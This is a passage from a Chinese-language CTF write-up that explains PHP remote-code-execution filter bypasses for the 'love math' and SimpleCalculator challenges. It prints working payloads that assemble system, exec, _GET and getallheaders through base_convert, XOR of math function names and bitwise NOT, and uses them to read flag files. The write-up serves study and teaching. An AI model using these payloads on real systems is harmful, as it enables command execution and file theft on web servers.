        echo "";
        endforeach;
    endforeach;
理解上述这些后，来分析下师傅最终的 payload：
    base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
    //base_convert(1751504350,10,36) ->system
    //base_convert(15941,10,36) -> cat
    //system('cat *')
而 `dechex(16)` 返回的值正好是 10 ，所以 `dechex(16)^asinh^pi` 这个表达式就相当于 `asinh^pi^"
*"^asinh^pi` 也就相当于 `" *"^"a"^"a"` 输出自然就是 `空格*` 。
当然构造不止 `asinh^pi` ，其他也能异或出 `空格*` ，只需要找到异或结果为十六进制形式的组合，再找到转十六进制与其相等的一个十进制数，利用
`hexdec()` 进行异或即可。
`dechex(11)^atan2^pow` 的结果也为 `空格*`
当然，既然能异或出特殊字符，那么异或出字母也不是什么难事，我们可以不用进制转换来构造关键字。
这部分放在下面的构造 `_GET` 绕过来一起分析。
* * *
接下来我们再来学习绕过的操作，N0rths 师傅是直接读取 flag 的，除了 `cat *` 以外，师傅还提到了 `nl f*`
这个命令来读取，以图为例：
命令解释：
> `nl [参数] [文件]`
>
> nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。
###  绕过姿势
####  构造 _GET
因为黑名单字符过滤较多，我们也可以用 `_GET[]` 来传 `system` 之类的命令，但 `[]` 被过滤了，师傅提到的一个 trick 就是
`{}` 代替 `[]` 。
先上 payload ：
    $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=tac flag.php
    // base_convert(37907361743,10,36) -> hex2bin
    // dechex(1598506324) -> 5f474554
    // hex2bin("5f474554") -> _GET
payload 的 `(pi){pi}((pi){abs})` 这一串又是什么意思呢？为什么能将变量 `pi` 的值作为函数使用？
这里牵扯到 php 可变变量和可变函数的用法。
> [php 可变变量](https://www.php.net/manual/zh/language.variables.variable.php)
>
> 简而言之，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如：
>  
>  
>     $a = "land";
>  
>
> 而一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。
>  
>  
>     $$a = "vidar";
>  
>
> 这时，两个变量都被定义了：`$a` 的内容是 `“land”` 并且 `$land` 的内容是 `“vidar”` 。
>
> 回到正题，`$pi` 的值为 `hex2bin("5f474554")` ，`$$pi` 也就是 `$hex2bin("5f474554") ->
> $_GET` ，变成了预定义变量。
>
> [php 可变函数](https://www.php.net/manual/zh/functions.variable-functions.php)
>
> PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP
> 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。
>
> 上面说过，`{}` 其实是代替 `[]` ，其实本为 `(pi)[pi]((pi)[abs])` ，即 `_GET[pi]((_GET)[abs])`
> ，
>
> 而 `pi` 的值正好是 `system` ，php 就会寻找 `system` 函数来执行圆括号里的语句。
>
> 即 `system('tac flag.php')`
而上面说过，我们可以不利用进制转换，单纯异或构造语句：
    $pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat /flag
同样这里利用了 php 可变变量和可变函数，但异或的对象有所不同，前文中明摆着我们是两个字符串相异或，而这里的 `is_nan^(6).(4)`
又会是什么结果呢？
[Mustapha Mond 师傅的 fuzz
脚本](https://www.cnblogs.com/20175211lyz/p/11588219.html)
    $exp");
                echo "";
            }
        }
    }
这里的 `$i.$j` 其实是字符串类型，也就是我们利用数学函数名与 01~99 范围的字符串想异或，这样我们可以得到字母（当然部分特殊字符也能得出）：
而 payload 中的 `(is_nan^(6).(4)).(tan^(1).(5))` 正是 `"_G"."ET"` ，即 `_GET` 。
####  getallheaders 利用请求头传语句
长度限制 80 是很容易超长的，何况还有白名单函数的限制，不能直接输入 `cat` 等命令，而我们可以利用 `getallheaders`
这个函数，把命令放在请求头来拼接语句。
函数解释：
> [getallheaders](https://www.php.net/manual/zh/function.getallheaders.php)
>
> 获取全部 HTTP 请求头信息。
payload：
    $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
    //base_convert(696468,10,36) -> exec
    //base_convert(8768397090111664438,10,30) -> getallheaders
    //exec(getallheaders(){1})
在报文头中相应属性，值为要执行的命令：
好了，love math 到此告一段落，来看看今年的护网杯的 SimpleCalculator 。
## SimpleCalculator
###  取反绕过
这题其实 love math 的异或 payload 就能打出来，摆出这道题其实只是为了介绍另外一种运算 `~` 。
> `~` 运算符
>
> 按位取反，将 `$a` 中为 0 的位设为 1，反之亦然。
>
> 也就是说，我们要返回 `system` ，可以按位用其反码来构造 payload 。
因为记忆比较模糊，可能说的不太准确，当初 fuzz 的时候，其实输入框的限制是非常严格的：
    _ ' " 空格 hex2bin、dechex、chr等等一些可以与字符互转的函数 system、exec等等一些可以命令执行的函数
上面这些都被匹配到了，长度还限制 80 ，但对 url 上的却有松懈，因此可以说是 yt 。
这里要分析的是本校师傅给的一个神奇 payload ：
    $ip=(~%8C%86%8C%8B%9A%92);$ip(~%9C%9E%8B%DF%D0%99%93%9E%98);
`%8C%86%8C%8B%9A%92` 这些是 url 编码，解码后转换为 ascii 码，ascii
码再转换为二进制数，取其反码，然后逆操作，最后得到的值就是 `system` 。
以 `%8C` 为例，进行的运算用函数表示如下：
    echo chr(~ord(urldecode('%8C')));
    //s
exp：
#  0x03 后记
其实通篇看下来，最主要利用的是 php 位运算、可变变量、可变函数这些特性，用 math 函数结合 rce
（这是次要的）。感觉还是要潜心学习一门语言，把它的特性深入了解后，才能在安全方面发挥最大作用。